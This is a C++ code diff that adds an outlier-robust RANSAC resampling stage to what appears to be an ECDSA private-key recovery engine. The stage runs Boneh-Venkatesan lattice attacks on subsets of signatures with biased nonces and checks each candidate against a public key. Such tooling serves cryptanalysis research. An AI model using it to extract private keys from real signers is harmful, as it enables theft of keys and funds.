@@ -5,6 +5,7 @@
 #include "utils.h"
 #include <algorithm>
 #include <cstdlib>
+#include <random>
 #include <string>
 
 namespace last_resort {
@@ -38,6 +39,52 @@ std::vector<Pair> shared_prefix_pairs(
         out.push_back(Pair{W, X});   // Pair{w, x}; source_index/known_low_value default
     }
     return out;
+}
+
+size_t ransac_subset_size(int L, size_t pool) {
+    long base = std::lround(256.0 / std::max(1, L)) + 8;
+    long lo = 24;
+    long hi = std::max<long>(lo, std::min<long>(64, static_cast<long>(pool)));
+    return static_cast<size_t>(std::clamp(base, lo, hi));
+}
+
+std::optional<mpz> ransac_recover(
+    const std::vector<Pair>& pairs, const mpz& pubkey_hint,
+    uint64_t seed, size_t max_iters,
+    const std::vector<int>& l_candidates, Telemetry* tel) {
+    if (pubkey_hint <= 1) return std::nullopt;   // pubkey is the consensus gate
+    if (pairs.size() < 24) return std::nullopt;  // too few pairs for the HNP
+    for (size_t it = 0; it < max_iters; ++it) {
+        if (tel && tel->deadline_exceeded()) break;
+        if (tel) tel->set_status("RANSAC resample iter " + std::to_string(it + 1));
+        for (size_t li = 0; li < l_candidates.size(); ++li) {
+            int L = l_candidates[li];
+            size_t s = ransac_subset_size(L, pairs.size());
+            if (pairs.size() < s) continue;
+            // Deterministic per (seed, iter, L): a fixed input+seed reproduces
+            // the whole draw sequence and result (invariant 4). Note: std::sample's
+            // selection order is implementation-defined, so reproducibility is
+            // guaranteed only within one toolchain/stdlib build (which is all
+            // invariant 4 requires); a stdlib change could shift which subsets are
+            // drawn -- never correctness (pubkey-gated), only the draw sequence.
+            std::mt19937_64 rng(seed ^ (it * 0x9E3779B97F4A7C15ULL)
+                                     ^ (static_cast<uint64_t>(L) << 1));
+            std::vector<Pair> subset;
+            subset.reserve(s);
+            std::sample(pairs.begin(), pairs.end(),
+                        std::back_inserter(subset), s, rng);
+            fplll::ZZ_mat<mpz_t> basis;
+            mpz scaling;
+            if (!LatticeSolver::build_boneh_venkatesan_basis(subset, L, basis, scaling))
+                continue;
+            // nullptr telemetry to reduce_and_extract: avoid churning per-iter
+            // telemetry 2*max_iters times; the deadline/status live in this loop.
+            auto d = LatticeSolver::reduce_and_extract(basis, subset, nullptr, 0, pubkey_hint);
+            if (d.has_value() && utils::verify_pubkey(*d, pubkey_hint))
+                return d;
+        }
+    }
+    return std::nullopt;
 }
 
 } // namespace last_resort
@@ -78,6 +125,24 @@ std::optional<mpz> RecoveryEngine::try_shared_prefix_reuse(
     return std::nullopt;
 }
 
+std::optional<mpz> RecoveryEngine::try_ransac_resample(
+    const std::vector<Pair>& pairs, const mpz& pubkey_hint) {
+    if (pubkey_hint <= 1) return std::nullopt;
+    if (pairs.size() < 24) return std::nullopt;
+    tel_.set_phase("last-resort: RANSAC resampling (outlier-robust)");
+    auto d = last_resort::ransac_recover(
+        pairs, pubkey_hint, tel_.sampling_seed.load(),
+        last_resort::RANSAC_MAX_ITERS, last_resort::ransac_l_candidates(), &tel_);
+    if (d.has_value() && utils::verify_pubkey(*d, pubkey_hint)) {
+        tel_.active_method = static_cast<int>(RecoveryMethod::AUTO);
+        tel_.method_chosen = true;
+        last_resort_desc_ = "outlier-robust RANSAC resampling (bias present in a "
+                            "subset amid non-biased outliers)";
+        return d;
+    }
+    return std::nullopt;
+}
+
 std::optional<mpz> RecoveryEngine::try_last_resort(
     const std::vector<Signature>& signatures,
     const std::vector<Pair>& pairs,
@@ -105,6 +170,19 @@ std::optional<mpz> RecoveryEngine::try_last_resort(
             overall_ceiling, tel_.elapsed_seconds(), last_resort::SHARED_PREFIX_CAP_SEC);
         tel_.set_status("last-resort: shared-prefix nonce reuse");
         auto d = try_shared_prefix_reuse(pairs, pubkey_hint);
+        if (verified(d)) return d;
+    }
+
+    // 0b. RANSAC resampling (Tier 1.3): outlier-robust. Draw random subsets
+    //     (small s minimizes outliers/draw) and pubkey-verify; profiler-
+    //     independent. Recovers light-moderate noise; heavy noise exhausts the
+    //     budget without a wrong key. Cheaper/more common than modulo, so first
+    //     among the lattice sweeps after shared-prefix.
+    if (!ceiling_hit()) {
+        tel_.time_budget_sec = last_resort::stage_deadline(
+            overall_ceiling, tel_.elapsed_seconds(), last_resort::RANSAC_CAP_SEC);
+        tel_.set_status("last-resort: RANSAC resampling");
+        auto d = try_ransac_resample(pairs, pubkey_hint);
         if (verified(d)) return d;
     }
 
